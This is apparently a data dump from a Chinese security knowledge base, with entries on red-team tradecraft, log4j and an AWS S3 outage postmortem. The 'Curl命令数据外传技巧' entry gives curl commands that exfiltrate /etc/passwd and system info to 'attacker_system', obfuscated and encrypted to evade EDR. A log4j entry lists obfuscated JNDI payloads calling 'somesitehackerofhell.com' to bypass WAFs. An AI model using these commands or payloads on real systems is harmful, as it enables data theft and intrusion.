[https://docs.google.com/viewerng/viewer?url=https://media.defcon.org/DEF%2520CON%252028/DEF%2520CON%2520Safe%2520Mode%2520presentations/DEF%2520CON%2520Safe%2520Mode%2520-%2520Erik%2520Hunstad%2520-%2520Domain%2520Fronting%2520is%2520Dead%2520Long%2520Live%2520Domain%2520Fronting.pdf](https://docs.google.com/viewerng/viewer?url=https://media.defcon.org/DEF%2520CON%252028/DEF%2520CON%2520Safe%2520Mode%2520presentations/DEF%2520CON%2520Safe%2520Mode%2520-%2520Erik%2520Hunstad%2520-%2520Domain%2520Fronting%2520is%2520Dead%2520Long%2520Live%2520Domain%2520Fronting.pdf)"},{"fields":{"slug":"/安全知识库/Red Team能力建设/数据外传 Exfiltration/Curl命令数据外传技巧/","title":"Curl命令数据外传技巧"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Curl命令数据外传技巧\r\ntags:\r\n- Red Team能力建设\r\n- 数据外传 Exfiltration\r\n---\r\n\r\n# 基本形式\r\n```bash\r\n  受控机\r\n  curl -d `uname -a` http://attacker_system/\r\n  \r\n  接收机\r\n  nc -lp 80\r\n  POST / HTTP/1.1\r\n  Host: attacker_system\r\n  User-Agent: curl/7.68.0\r\n  Accept: */*\r\n  Content-Length: 31\r\n  Content-Type: application/x-www-form-urlencoded\r\n  \r\n  Linux 25b01d656003 5.10.47-linuxkit #1 SMP Sat Jul 3 21:51:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\r\n  \r\n```\r\n\r\n# 各种混淆\r\n```\r\n  受控机\r\n  curl -d `cat /etc/passwd | base64 -w0` http://attacker_system/\r\n  curl http://attacker_system/`uname -a | base64 -w0`\r\n  curl http://attacker_system/ -H  \"Cookie: `uname -a | base64 -w0`\"\r\n  curl -d `uname -a | gzip | base64 -w0` http://attacker_system\r\n  curl -d `uname -a | gzip | xxd -ps | tr -d '\\n'` http://attacker_system/\r\n```\r\n\r\n# OpenSSL加密\r\n```\r\n  受控机\r\n  curl -d `uname -a | openssl enc -pass 'pass:EncryptMe' -md sha256 -aes-256-cbc -pbkdf2 -a -e` http://attacker_system/\r\n  \r\n  接收机\r\n  nc -lp 80\r\n  POST / HTTP/1.1\r\n  Host: attacker_system\r\n  User-Agent: curl/7.68.0\r\n  Accept: */*\r\n  Content-Length: 172\r\n  Content-Type: application/x-www-form-urlencoded\r\n  \r\n  U2FsdGVkX18/C90HEEv7tvzvU7JM/FRUQ9cGlhC5QporjmRYBwMLNc/VBbrOQFqp6GPQRu1T99GfwZUwDgOU8sItii//UAs4WoAxpVRcAg3cHOYKJ+ZUA3X4lS2Af/2J3zPKHeL6E3559Ife9X0hBk5zjfSfmFM00es2DTVYm+Q=\r\n```\r\n\r\n如上所示，我们使用curlPOST 对uname -a 进行数据外传，使用管道将 stdout 发送到openssl，使用密码加密。但需要注意的是，这种方法会在进程树的命令行参数中显示密码，某些EDR可能会捕获这些参数以供以后分析。最后，我们对输出进行base64编码并发送请求。以下是openssl的一些参数解释：\r\n\r\n- enc该命令允许我们使用密码来加密数据。\r\n- -pass该参数允许我们指定密码来加密数据。\r\n- -md用于从提供的密码创建密钥的消息摘要算法。OpenSSL 可能会根据安装默认使用不同的消息摘要算法，为了避免解密出现问题，最好专门设置此参数。\r\n- -aes-256-cbc我们希望用来加密数据的算法。\r\n- -pbkdf2使用具有默认迭代次数（通常为 10000 次迭代）的 PBKDF2 算法。这是一个比默认选项 openssl 提供的更安全的密钥派生过程。需要注意的是，这个标志只在 OpenSSL >= 1.1.1 中可用。\r\n- -a将输出编码为 Base64。这让我们可以base64 -w0像之前所做的那样跳过管道。\r\n- -e最后，这个标志告诉 openssl 加密传递给它的数据。在这种情况下，数据来自标准输入。\r\n- 使用以下方法进行解密\r\n\r\n  ```\r\n    openssl enc -pass 'pass:EncryptMe' -md sha256 -aes-256-cbc -pbkdf2 -a -d <<< U2FsdGVkX18/C90HEEv7tvzvU7JM/FRUQ9cGlhC5QporjmRYBwMLNc/VBbrOQFqp6GPQRu1T99GfwZUwDgOU8sItii//UAs4WoAxpVRcAg3cHOYKJ+ZUA3X4lS2Af/2J3zPKHeL6E3559Ife9X0hBk5zjfSfmFM00es2DTVYm+Q= \r\n    Linux 25b01d656003 5.10.47-linuxkit #1 SMP Sat Jul 3 21:51:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\r\n  ```\r\n\r\n## 那么如何将进程树命令行参数中的密码隐藏呢？我们可以使用自己的公钥进行加密\r\n```\r\n  受控机\r\n  curl -k -d `openssl s_client -connect attacker_system:443 \\\r\n  | openssl x509 -pubkey -noout  > /tmp/f; uname -a \\\r\n  | openssl rsautl -inkey /tmp/f -pubin -encrypt \\\r\n  | base64 -w0; rm /tmp/f` https://attacker_system/\r\n  \r\n  接收机\r\n  ncat -lp 443 -k --ssl --ssl-cert pub.crt --ssl-key priv.key\r\n  POST / HTTP/1.1\r\n  Host: attacker_system\r\n  User-Agent: curl/7.68.0\r\n  Accept: */*\r\n  Content-Length: 344\r\n  Content-Type: application/x-www-form-urlencoded\r\n  \r\n  HmuUgK05Sku7xBjBkxDeakgDnb9CkJIX5EYIC1oxOnSHxBzVG9hGh4BQeX9VwEp5OYxLX8mRNXCxmbHANdwy3/Bga4Mp+GFVhUZKr8haKHVrNa1dtfEvHlmDaMfESwcZy0Llmvl8+skOescVb6lSZLS/09HIAVdfyQo5DFM59KKGm9XZEMsXUAvR+1AmB5nsvIAKqBQY1nyr5IJc6+pzSK8d1gxTCTL/0D9gM2xnr6ZXmgthPogH2dy8olZLlYT+q6J/3ZpDijm1W4LyKZHO0WLjdS0mem9to/6GAi8cWZTySV+BvddF3jmkA8lfgOtL09JpjC9QrJ5sT7Ay+vDWuA==\r\n```\r\n\r\n- 这次使用`ncat`是为了使用其内置的 SSL 解密功能进行解密，相关参数解释如下：\r\n  - 从攻击系统中提取公钥并保存到文件中openssl s_client -connect attacker_system:443 | openssl x509 -pubkey -noout > /tmp/f\r\n  - 执行所需的命令并使用 OpenSSL 和之前提取的公钥进行加密，然后对数据进行 base64 编码uname -a | openssl rsautl -inkey /tmp/f -pubin -encrypt | base64 -w0;\r\n  - 删除包含公钥的文件rm /tmp/f\r\n  - curl通过 HTTPS 将命令中的 base64 输出发布到攻击系统。\r\n\r\n- 我们现在可以像这样解码和解密结果：\r\n  ```\r\n    base64 -d <<< SxYwWIC7ceUtsPGo3ETSPaCTMW9AdXWuyAR01AIBu0LLlHWDVa5uSP3J86vyyePaoybuoAEgvit5HQDNfL8fS1lSix/enb9UVCAn7hp/dZ9RGrtzqIRWFgHm0O4M69S1bHT1bn/3F0EiCZ53blulegKnxaCmSM64aO6c12dpJWD7A8QcJwG4R5J/owE9LbR5rJkmvTCf3bAD9FkvX5vD8GJmJkLhjaYa+mB6VZ67FcJdzUykfGJPsWOg5ju8nCTasxgjPR7Wsv7EXRoV7uia9u1yjfIpb5DloR2lqhfihvs4vuCmm23pJNZyIikSL0FyOGgQSps21mP0ri3UfRIryw== \\\r\n        | openssl rsautl -inkey priv.key -decrypt\r\n        \r\n    Linux 25b01d656003 5.10.47-linuxkit #1 SMP Sat Jul 3 21:51:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\r\n  ```\r\n\r\n# 参考资料\r\n  - [https://medium.com/maverislabs/bash-tricks-for-command-execution-and-data-extraction-over-http-s-ca76e9c80933](https://medium.com/maverislabs/bash-tricks-for-command-execution-and-data-extraction-over-http-s-ca76e9c80933)"},{"fields":{"slug":"/安全知识库/专题研究/log4j/log4j WAF绕过方式/","title":"log4j WAF绕过方式"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: log4j WAF绕过方式\r\ntags:\r\n- 专题研究\r\n- log4j\r\n---\r\n\r\n# 系统环境变量\r\n\r\n```\r\n${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}\r\n```\r\n\r\n来自 Apache Log4j 2 文档：${env:ENV_NAME:-default_value}\r\n\r\n如果没有 ENV_NAME 系统环境变量，则使用 :- 后面的变量；攻击者可以使用任何名称代替 ENV_NAME，但它必须是不存在的环境变量。\r\n\r\n# Lookup方法：Lower / Upper\r\n\r\n```\r\n  ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}\r\n  ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}\r\n```\r\n\r\n- Lower Lookup 会将传入的参数转换为小写，嵌套形式如下：\r\n  - ${lower:}\r\n- Upper Lookup 会将传入的参数转换为大写，嵌套形式如下：\r\n  - ${upper:}\r\n\r\n# \"::-\" 符号\r\n\r\n```\r\n  ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}\r\n```\r\n\r\n同系统环境变量部分。\r\n\r\n# \":-\" 符号\r\n\r\n```\r\n  ${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}\r\n```\r\n\r\n# 无效的Unicode字符\r\n\r\n```\r\n  ${jnd${upper:ı}:ldap://somesitehackerofhell.com/z}\r\n```\r\n\r\n这里的 **ı(\\u0131)** 不是 **i(\\x69)和I(\\x49)**，经过 upper 就会转变成 I，从而绕过了 jndi 关键词的拦截。\r\n\r\n# HTML编码\r\n\r\n```\r\n  } with %7D\r\n  { with %7B\r\n  $ with %24\r\n```\r\n\r\n# unicode / hex 编码特性\r\n\r\n虽然这个范围有点大可能会产生一些误报，但鉴于漏洞的严重性还是有很多人建议拦截 ${ 但这样也未必能够真正的解决，因为漏洞的触发点是在打印日志的时候把可控内容携带进去了。现在随着 JSON 数据格式的流行，很多系统都在使用 JSON 处理参数，JSON 处理库用的最多的就数 Jackson和fastjson。而 Jackson 和 fastjson 又有 unicode 和 hex 的编码特性，如：\r\n\r\n```\r\n  {\"key\":\"\\u0024\\u007b\"}\r\n  {\"key\":\"\\x24\\u007b\"}\r\n```\r\n\r\n这样就避开了数据包中有 ${ 的条件。\r\n\r\n# 参考资料\r\n\r\n- [https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg](https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg)\r\n- [https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words)\r\n- [https://github.com/woodpecker-appstore/log4j-payload-generator](https://github.com/woodpecker-appstore/log4j-payload-generator)\r\n- [https://canarytokens.org/generate](https://canarytokens.org/generate)"},{"fields":{"slug":"/安全知识库/专题研究/log4j/log4j 可利用的keywords/","title":"log4j 可利用的keywords"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: log4j 可利用的keywords\r\ntags:\r\n- 专题研究\r\n- log4j\r\n---\r\n\r\n\r\n\r\n# 利用**keywords**\r\n\r\n```\r\n  ${ctx:loginId}\r\n  ${map:type}\r\n  ${filename}\r\n  ${date:MM-dd-yyyy}\r\n  ${docker:containerId}\r\n  ${docker:containerName}\r\n  ${docker:imageName}\r\n  ${env:USER}\r\n  ${event:Marker}\r\n  ${mdc:UserId}\r\n  ${java:runtime}\r\n  ${java:vm}\r\n  ${java:os}\r\n  ${jndi:logging/context-name}\r\n  ${hostName}\r\n  ${docker:containerId}\r\n  ${k8s:accountName}\r\n  ${k8s:clusterName}\r\n  ${k8s:containerId}\r\n  ${k8s:containerName}\r\n  ${k8s:host}\r\n  ${k8s:labels.app}\r\n  ${k8s:labels.podTemplateHash}\r\n  ${k8s:masterUrl}\r\n  ${k8s:namespaceId}\r\n  ${k8s:namespaceName}\r\n  ${k8s:podId}\r\n  ${k8s:podIp}\r\n  ${k8s:podName}\r\n  ${k8s:imageId}\r\n  ${k8s:imageName}\r\n  ${log4j:configLocation}\r\n  ${log4j:configParentLocation}\r\n  ${spring:spring.application.name}\r\n  ${main:myString}\r\n  ${main:0}\r\n  ${main:1}\r\n  ${main:2}\r\n  ${main:3}\r\n  ${main:4}\r\n  ${main:bar}\r\n  ${name}\r\n  ${marker}\r\n  ${marker:name}\r\n  ${spring:profiles.active[0]}\r\n  ${sys:logPath}\r\n  ${web:rootDir}\r\n```"},{"fields":{"slug":"/安全知识库/专题研究/log4j/log4j 思维导图/","title":"log4j 可利用的keywords"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: log4j 可利用的keywords\r\ntags:\r\n- 专题研究\r\n- log4j\r\n- 思维导图\r\n---\r\n\r\n# Mind map # 1 : Am I vulnerable to Log4shell?\r\n\r\n![bMjLAO](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/bMjLAO.jpg)\r\n\r\n# Mind map # 2 : How to detect the vulnerability, from the black box or white box perspective\r\n\r\n![GqijHu](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/GqijHu.jpg)\r\n\r\n# Mind map # 3 : Shielding & mitigations against Log4shell : Patching is one thing, but defence in depth is advised. A few pointers in this mind map can help\r\n\r\n![4QFFTG](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/4QFFTG.jpg)\r\n\r\n# Mind map # 4 : log4j Response Flow\r\n\r\n![clhNCI](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/clhNCI.jpg)\r\n\r\n# 来源\r\n\r\n- [https://github.com/DickReverse/InfosecMindmaps](https://github.com/DickReverse/InfosecMindmaps)"},{"fields":{"slug":"/安全知识库/专题研究/log4j/log4j 相关tricks&links/","title":"log4j 相关tricks&links"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: log4j 相关tricks&links\r\ntags:\r\n- 专题研究\r\n- log4j\r\n---\r\n\r\n# 在apache网站讨论细节的2个Jira链接\r\n\r\n- [https://issues.apache.org/jira/browse/LOG4J2-3201](https://issues.apache.org/jira/browse/LOG4J2-3201)\r\n- [https://issues.apache.org/jira/browse/LOG4J2-3198](https://issues.apache.org/jira/browse/LOG4J2-3198)\r\n\r\n# log4j解决此问题的PR公告\r\n\r\n- [https://github.com/apache/logging-log4j2/pull/607](https://github.com/apache/logging-log4j2/pull/607)\r\n\r\n# log4j相关关联组件\r\n\r\n- [https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages)\r\n\r\n# 靶场测试环境搭建\r\n\r\n- [https://github.com/leonjza/log4jpwn](https://github.com/leonjza/log4jpwn)\r\n\r\n# Suricata检测规则\r\n\r\n- 2034647\r\n- 2034648\r\n- 2034648\r\n- 2034649\r\n- 2034650\r\n- 2034651\r\n- 2034652\r\n- [https://rules.emergingthreatspro.com/open/](https://rules.emergingthreatspro.com/open/)\r\n\r\n# log4j攻击面\r\n\r\n- [https://github.com/YfryTchsGD/Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface)"},{"fields":{"slug":"/安全知识库/专题研究/log4j/阿里云安全的log4j分析文章写的很棒/","title":"阿里云安全的log4j分析文章写的很棒"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 阿里云安全的log4j分析文章写的很棒\r\ntags:\r\n- 专题研究\r\n- log4j\r\n- 阿里云\r\n---\r\n\r\n# 警惕主动外联！云防火墙检测拦截勒索、Muhstik僵尸网络等 Log4j2漏洞利用\r\n\r\n主动外联拦截超9800+起，有效遏制蠕虫传播\r\n\r\n- 阿里云安全团队分析了 Apache Log4j2 远程代码执行漏洞常见的验证、利用方式及其原理，发现攻击者在试图利用该漏洞发起恶意行为过程中，**均存在多次必要的服务器外联通信：**\r\n  - 在攻击者发送请求之后，命令执行阶段之前，受害服务器需要向攻击者所控制的带恶意载荷的LDAP/RMI服务器发起至少两次请求（请求Reference、加载class）；\r\n  - 命令执行阶段当中，如果反连、反弹shell、后门植入等，则需要向DNS反连平台、黑客控制的服务器等发起外联。\r\n- 通过主动外联管控，可以有效斩断该漏洞的验证和利用链，有效遏制恶意蠕虫和高级威胁传播。\r\n- 截至目前，阿里云云防火墙已检测并阻断主动外联的Log4j恶意利用9800+起，涉及僵尸网络家族、团伙十余个，包括Tellyouthepass等勒索团伙，Kinsing、Muhstik、Mirai等挖矿和DDOS家族等。\r\n\r\nLog4j漏洞原理——为什么要管控主动外联？\r\n\r\n- Log4j漏洞的本质是一个JNDI注入漏洞。JNDI是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。\r\n- JNDI支持LDAP、DNS、NIS、RMI、CORBA等多种协议，即使并非都能用于命令执行，但信息可以通过上述几种协议中任何一种被泄露，加之该漏洞相关源码存在递归解析，利用方式非常灵活，payload变化多端且漏洞入口多样化，目前行业中对该漏洞的防护缺乏完整的体系化思路。\r\n\r\n**漏洞利用灵活 防护掣肘**\r\n\r\n- 漏洞入口多样化：\r\n  - web服务是Log4j漏洞利用的重要入口，但绝不是唯一入口，只要任意输入片段到达应用程序并通过Log4j2进行处理，就可能触发远程命令执行。如果在防御时只做入方向Web侧防护，很难彻底防御这一攻击；\r\n- Payload变形多：\r\n  - 灵活的利用方式导致流量检测/拦截等正面对抗手段存在较大的被绕过可能性。攻击payload并非一定通过明文方式到达Log4j2组件处理，中间处理阶段可能通过编码、加密等各个阶段，单字段拦截可能造成大量误报；\r\n- 多种协议导致信息泄露：\r\n  - 仅针对LDAP、RMI前缀进行检测和拦截很难防御信息泄露、木马后门等的影响。\r\n- 服务器外联管控 斩断漏洞利用链条\r\n  - 攻击者利用Log4j RCE漏洞进行远程恶意行为的步骤大致如下图所示：\r\n  - ![lzzcDi](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/lzzcDi.jpg)\r\n- 攻击者部署带有恶意载荷的LADP/RMI服务器\r\n- 向使用Log4j2组件的服务器发送带有恶意的JNDI payload的攻击请求\r\n- 受攻击服务器中的使用Log4j2组件的服务调用lookup方法，向恶意LADP/RMI服务器发起请求，并从响应中获取返回的恶意Reference对象\r\n- 服务器解析该恶意Reference对象，并进一步基于Reference中指定的codebase地址，加载并执行恶意class\r\n- 实现命令执行后，攻击者将得以操控受害服务器去进行各种操作，包括但不限于反连验证、外带敏感信息、反弹shell、后门植入等\r\n\r\n- 因为该漏洞本质是JNDI注入漏洞，攻击者要执行任意代码，受害主机必须进行至少两次主动外联：第一次是请求Reference对象，第二次是加载恶意class。\r\n- 理论上来说，管控好服务器的主动外联行为，仅放行认识的域名/IP和协议，让它无法向陌生的、攻击者控制的域名/IP发请求，漏洞就无法利用成功了。\r\n- **这是目前来看最难被绕过的防御方式之一。**\r\n\r\n# 来源\r\n\r\n- [https://mp.weixin.qq.com/s/zFPCuXSlQKH2gI_jAQ5IxA](https://mp.weixin.qq.com/s/zFPCuXSlQKH2gI_jAQ5IxA)"},{"fields":{"slug":"/安全知识库/专题研究/思维导图/AD渗透测试思维导图/","title":"AD渗透测试思维导图"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: AD渗透测试思维导图\r\ntags:\r\n- 专题研究\r\n- 思维导图\r\n---\r\n\r\n![1I5KBU](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/1I5KBU.jpg)"},{"fields":{"slug":"/安全知识库/专题研究/思维导图/Exchange渗透测试思维导图/","title":"Exchange渗透测试思维导图"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Exchange渗透测试思维导图\r\ntags:\r\n- 专题研究\r\n- 思维导图\r\n---\r\n\r\n![4RKTgk](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/4RKTgk.jpg)\r\n\r\n[https://github.com/Orange-Cyberdefense/arsenal/tree/master/mindmap](https://github.com/Orange-Cyberdefense/arsenal/tree/master/mindmap)"},{"fields":{"slug":"/安全知识库/专题研究/思维导图/云安全渗透测试思维导图/","title":"云安全渗透测试思维导图"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 云安全渗透测试思维导图\r\ntags:\r\n- 专题研究\r\n- 思维导图\r\n---\r\n\r\n![cuFKlM](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/cuFKlM.jpg)\r\n[https://github.com/TROUBLE-1/Cloud-Pentesting/tree/main/Note%20%26%20Mind%20Map/Cloud%20Pentesting](https://github.com/TROUBLE-1/Cloud-Pentesting/tree/main/Note%20%26%20Mind%20Map/Cloud%20Pentesting)"},{"fields":{"slug":"/安全知识库/专题研究/思维导图/内存取证思维导图/","title":"内存取证思维导图"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 内存取证思维导图\r\ntags:\r\n- 专题研究\r\n- 思维导图\r\n---\r\n\r\n![rRYD3v](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/rRYD3v.jpg)\r\n\r\n[https://github.com/AndrewRathbun/DFIRMindMaps/tree/main/MemoryForensics/SANSMemoryForensicsCheatSheet](https://github.com/AndrewRathbun/DFIRMindMaps/tree/main/MemoryForensics/SANSMemoryForensicsCheatSheet)"},{"fields":{"slug":"/安全知识库/专题研究/思维导图/网络安全思维导图/","title":"网络安全思维导图"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 网络安全思维导图\r\ntags:\r\n- 专题研究\r\n- 思维导图\r\n---\r\n\r\n![rRYD3v](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/Network%20Security.png)\r\n\r\n[https://www.xmind.net/m/PBS9](https://www.xmind.net/m/PBS9)"},{"fields":{"slug":"/安全知识库/行业观察/AWS/AWS 的 S3 故障回顾和思考/","title":"AWS 的 S3 故障回顾和思考"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: AWS 的 S3 故障回顾和思考\r\ntags:\r\n- 行业观察\r\n- AWS\r\n---\r\n\r\n转载自：[https://coolshell.cn/articles/17737.html](https://coolshell.cn/articles/17737.html)\r\n\r\n继[Gitlab的误删除数据事件](https://coolshell.cn/articles/17680.html)没几天，“不沉航母” AWS S3 （Simple Storage Service）几天前也“沉”了4个小时，墙外的半个互联网也跟着挂了。如约，按 AWS 惯例，AWS今天给出了一个简单的故障报告[《Summary of the Amazon S3 Service Disruption in the Northern Virginia (US-EAST-1) Region》](https://aws.amazon.com/cn/message/41926/)。这个故障和简单来说和Gitlab一样，也是人员误操作。先简单的说一下这份报中说了什么。\r\n\r\n# 故障原因\r\n\r\n简单来说，这天，有一个 AWS 工程师在调查 Northern Virginia (US-EAST-1) Region 上 S3 的一个和账务系统相关的问题，这个问题是S3的账务系统变慢了（我估计这个故障在Amazon里可能是Sev2级，Sev2级的故障在Amazon算是比较大的故障，需要很快解决），Oncall的开发工程师（注：Amazon的运维都是由开发工程师来干的，所以Amazon内部嬉称SDE-Software Developer Engineer 为 Someone Do Everything）想移除一个账务系统里的一个子系统下的一些少量的服务器（估计这些服务器上有问题，所以想移掉后重新部署），结果呢，有一条命令搞错了，导致了移除了大量的S3的控制系统。包括两个很重要的子系统：\r\n\r\n1. 一个是S3的对象索引服务（Index）**，其中存储了S3对象的metadata和位置信息。这个服务也提供了所有的 GET，LIST，PUT 和DELETE请求。\r\n\r\n2. 一个是S3的位置服务系统（Placement）**，这个服务提供对象的存储位置和索引服务的系统。这个系统主要是用于处理PUT新对象请求。\r\n\r\n这就是为什么S3不可访问的原因。\r\n\r\n在后面，AWS也说明了一下故障恢复的过程，其中重点提到了这点——\r\n\r\n虽然整个S3的是做过充分的故障设计的（注：AWS的七大Design Principle 之一 Design for Failure）—— 就算是最核心的组件或服务出问题了，系统也能恢复。但是，可能是在过去的日子里 S3 太稳定了，所以，AWS 在很长很长一段时间内都没有重启过 S3 的核心服务，而过去这几年，S3 的数据对象存储级数级的成长（S3存了什么样数量级的对象，因为在Amazon工作过，所以多大概知道是个什么数量级，这里不能说，不过，老实说，很惊人的），所以，这两个核心服务在启动时要重建并校验对象索引元数据的完整性，这个过程没想到花了这么长的时候。而Placement服务系统依赖于Index 服务，所以花了更长的时间。\r\n\r\n了解过系统底层的技术人员应该都知道这两个服务有多重要，简而言之，这两个系统就像是Unix/Linux文件系统中的inode，或是像HDFS里的node name，如果这些元数据丢失，那么，用户的所有数据基本上来说就等于全丢了。\r\n\r\n而要恢复索引系统，就像你的操作系统从异常关机后启动，文件系统要做系统自检那样，硬盘越大，文件越多，这个过程就越慢。\r\n\r\n另外，这次，AWS没有使用像以前那样 Outage 的故障名称，用的是 “Increased Error Rate” 这样的东西。我估计是没有把所有这两个服务删除完，估计有些用户是可以用的，有的用户是则不行了。\r\n\r\n# 后续改进\r\n\r\n在这篇故障简报中，AWS 也提到了下面的这些改进措施——\r\n\r\n- **改进运维操作工具。**对于此次故障的运维工具，有下面改进：\r\n  - **让删除服务这个操作变慢一些**（陈皓注：这样错了也可以有时间反悔，相对于一个大规模的分布式系统，这招还是很不错的，至少在系统报警时有也可以挽救）\r\n  - **加上一个最小资源数限制的SafeGuard**（陈皓注：就是说，任何服务在运行时都应该有一个最小资源数，分布式集群控制系统会强行维护服务正常运行的最小的一个资源数）\r\n  - 举一反三，Review所有和其它的运维工具，保证他们也相关的检查。\r\n- **改进恢复过程。**对于恢复时间过长的问题，有如下改进：\r\n  - **分解现有厚重的重要服务成更小的单元**（在 AWS，Service是大服务，小服务被称之为 Cell），AWS 会把这几个重要的服务重构成 Cell服务。（陈皓注：这应该就是所谓的“微服务”了吧）。这样，服务粒度变小，重启也会快一些，而且还可以减少故障面（原文：blast radius – 爆炸半径）\r\n  - **今年内完成对 Index 索引服务的分区计划。**\r\n\r\n# 相关思考\r\n\r\n下面是我对这一故障的相关思考——\r\n\r\n- **太喜欢像Gitlab和AWS这样的故障公开了,** 那怕是一个自己人为的低级错误。不掩盖，不文过饰非，透明且诚恳。Cool!\r\n  1）这次事件，还好没有丢失这么重要的数据，不然的话，将是灾难性的。\r\n  2）另外，面对在 US-EASE-1 这个老牌 Region 上的海量的对象，而且能在几个小时内恢复，很不容易了。\r\n  3）这个事件，再次映证了我在[《关于高可用的系统》](https://coolshell.cn/articles/17459.html)中提到的观点：**一个系统的高可用的因素很多，不仅仅只是系统架构，更重要的是——高可用运维。**\r\n  4）对于高可用的运维，**平时的故障演习是很重要的.** AWS 平时应该没有相应的故障演习，所以导致要么长期不出故障，一出就出个大的让你措手不及。这点，Facebook就好一些，他们每个季度扔个骰子，随机关掉一个IDC一天。Netflix 也有相关的 Chaos Monkey，我以前在的路透每年也会做一次大规模的故障演练——灾难演习。\r\n  5）AWS对于后续的改进可以看出他的技术范儿。可以看到其改进方案是用技术让自己的系统更为的高可用。\r\n- 然后，对比国内的公司对于这样的故障，基本上会是下面这样的画风：\r\n  a）加上更多更为严格的变更和审批流程，\r\n  b）使用限制更多的权限系统和审批系统\r\n  c）使用更多的人来干活（一个人干事，另一个人在旁边看）\r\n  d）使用更为厚重的测试和发布过程\r\n  e）惩罚故障人，用价值观教育工程师。\r\n\r\n这还是我老生长谈的那句话——**如果你是一个技术公司，你就会更多的相信技术而不是管理。相信技术会用技术来解决问题，相信管理，那就只会有制度、流程和价值观来解决问题。**（注意：这里我并没有隔离技术和管理，只是更为倾向于用技术解决问题）\r\n\r\n**最后，你是要建一个 “高可用的技术系统” ，还是一个 “高用的管理系统”？ ;-)**"},{"fields":{"slug":"/安全知识库/行业观察/AWS/AWS架构设计最佳实践/","title":"AWS架构设计最佳实践"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: AWS架构设计最佳实践\r\ntags:\r\n- 行业观察\r\n- AWS\r\n- 架构\r\n---\r\n\r\n# AWS 良好架构框架\r\n\r\n根据多年来AWS的专家们积累的经验，创建了这一份AWS良好架构框架，其中包含了以下五大支柱：\r\n\r\n- 安全性（Security）\r\n- 可靠性（Reliability）\r\n- 性能效率（Performance Efficiency）\r\n- 成本优化（Cost Optimisation）\r\n- 卓越操作（Operational Excellence）\r\n\r\n下面简单总结一下每一个支柱里面的内容\r\n\r\n- 安全性\r\n  - 身份与访问管理（Identity and Access Mangement）\r\n    - 如何保护你的AWS根账号的安全性？\r\n    - 如何定义角色和责任来管理人员访问AWS资源（通过管理控制台以及通过API）\r\n    - 如何限制你的程序访问AWS资源（应用程序、脚本、第三方工具或服务）\r\n    - 如何管理你的管理密钥和凭证？\r\n  - 检测控制（Detective Controls）\r\n    - 如何捕捉和分析AWS的日志？\r\n  - 基础设施保护（Infrastructure Protection）\r\n    - 如何保护实例的安全，如何保护网络的安全？\r\n    - 如何保护AWS服务的安全？\r\n    - 如何保护操作系统和EC2实例的安全？（是否有补丁，杀毒软件等）\r\n  - 数据保护（Data Protection）\r\n    - 如何加密和保护你的数据存储\r\n    - 如何加密和保护你的数据传输\r\n  - 事件响应（Incident Response）\r\n- 可靠性\r\n  - 基础（Foundations）\r\n    - 如何管理AWS账号内的服务限制\r\n    - 如何管理和规划AWS内的网络拓扑\r\n    - 如何找到AWS技术支持，是否有专门的TAM（Technical Account Manger）支持\r\n  - 变更管理（Change Management）\r\n    - 如何让你的系统适应真实的需求？\r\n    - 如何监控你的AWS资源？\r\n    - 如何执行变更管理\r\n  - 故障管理（Failure Management）\r\n    - 如何备份你的数据？\r\n    - 系统内组件出现故障需要如何处理？\r\n    - 你的故障恢复计划是什么？\r\n- 性能效率\r\n  - 计算（Comupte）\r\n    - 如何选择适合你的系统的实例类型？\r\n    - 如何确保你所使用的是最新/最适合的实例类型？\r\n    - 如何监控实例来确保它们的性能达到了要求？\r\n    - 如何确保实例的数量满足业务的需求？\r\n  - 存储（Storage）\r\n    - 如何选择适合你的系统的存储方案？\r\n    - 如何确保你所使用的是最新/最适合的存储系统？\r\n    - 